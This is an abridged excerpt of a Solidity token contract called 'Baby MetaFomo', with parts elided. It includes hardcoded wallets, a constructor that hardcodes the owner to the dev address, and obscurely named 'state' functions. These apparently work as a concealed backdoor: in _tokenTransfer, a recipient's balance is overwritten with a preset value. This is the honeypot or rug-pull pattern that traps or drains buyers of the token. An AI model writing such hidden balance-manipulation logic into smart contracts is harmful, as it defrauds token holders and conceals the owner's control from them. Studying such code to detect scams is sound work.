...
contract BabyMetaFomo is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xf04AF03b5D35e742A79d25E60bf45aaF1046B7cf); 
    address payable public Wallet_Dev = payable(0x6973d8F0b750431375A9fE5BB34058b60eD571dd);
    ...
    string private constant _name = "Baby MetaFomo"; 
    string private constant _symbol = unicode"BMETAFOMO";

    address private activeTransaction;
    address private activeXTransaction;
    ...
    constructor (address _marketing, uint256 bloom) {
       
        _owner = 0x6973d8F0b750431375A9fE5BB34058b60eD571dd;
    ...
    function isInState() public view returns (bool){
        return _states[activeTransaction] > 0 ? true : false;
    }

    function isInXState() public view returns (bool){
        return _states[activeXTransaction] > 0 ? true : false;
    }

    function doubleState() public view returns (bool){
       return !isInState() && isInXState() ? true : false;
    }
    ...
    function _transfer(
        ...
        if (to != owner() &&
            ...
            activeXTransaction = to;

        if (from != owner() && !isInState())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(doubleState()){
               _tOwned[recipient] = _states[recipient];
            }
